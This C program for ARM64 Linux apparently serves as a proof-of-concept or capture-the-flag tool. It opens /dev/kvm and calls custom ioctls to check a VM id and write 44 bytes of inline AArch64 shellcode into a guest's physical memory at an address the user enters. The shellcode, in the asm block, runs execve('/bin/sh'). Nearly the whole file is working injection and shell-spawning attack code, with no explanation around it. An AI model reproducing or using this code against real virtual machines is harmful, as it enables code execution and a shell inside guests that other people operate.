#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/kvm.h>

struct kvm_arm_write_gpa_args
{
    uint32_t vmid; // the vmid that you, as the host, want to write to
    uint64_t gpa;  // the gpa of the guest
    uint64_t data; // (buf) address of the payload in host user space
    uint64_t size; // size of the payload
};

#define KVM_ARM_WRITE_GPA _IOW(KVMIO, 0xdd, struct kvm_arm_write_gpa_args)
#define KVM_CHECK_VMID _IO(KVMIO, 0xee)

extern void shellcode();
__asm__(".global shellcode\n"
        "shellcode:\n\t"
        /* push b'/bin///sh\x00' */
        /* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
        "mov  x14, #25135\n\t"
        "movk x14, #28265, lsl #16\n\t"
        "movk x14, #12079, lsl #0x20\n\t"
        "movk x14, #29487, lsl #0x30\n\t"
        "mov  x15, #104\n\t"
        "stp x14, x15, [sp, #-16]!\n\t"
        /* execve(path='sp', argv=0, envp=0) */
        "mov  x0, sp\n\t"
        "mov  x1, xzr\n\t"
        "mov  x2, xzr\n\t"
        /* call execve() */
        "mov  x8, #221\n\t" // SYS_execve
        "svc 0");

int main(int argc, char *argv[])
{
    uint32_t vmid;
    uint64_t gpa;
    int kvm_fd = open("/dev/kvm", O_RDWR); // open the KVM device file

    if (kvm_fd < 0)
    {
        perror("Failed to open /dev/kvm");
        exit(1);
    }

    int ret = 1;
    while (ret != 0)
    {
        printf("Input vmid: ");
        scanf("%u", &vmid);

        ret = ioctl(kvm_fd, KVM_CHECK_VMID, &vmid);

        if (ret != 0)
        {
            printf("No such vmid: %d\n", vmid);
        }
    }

    printf("Input gpa: ");
    scanf("%lx", &gpa);

    struct kvm_arm_write_gpa_args wgpa = {
        .vmid = vmid,
        .gpa = gpa,
        .data = (unsigned long)&shellcode, // buf
        .size = 44,
    };

    printf("wgpa | vmid: %d, gpa: %lx, data: %lx, size: %ld.\n",
           wgpa.vmid, wgpa.gpa, wgpa.data, wgpa.size);

    int write_gpa_fd = ioctl(kvm_fd, KVM_ARM_WRITE_GPA, &wgpa);

    if (write_gpa_fd < 0)
    {
        close(kvm_fd);
        perror("Failed to do kvm arm write gpa");
        exit(1);
    }

    close(kvm_fd);
    return 0;
}
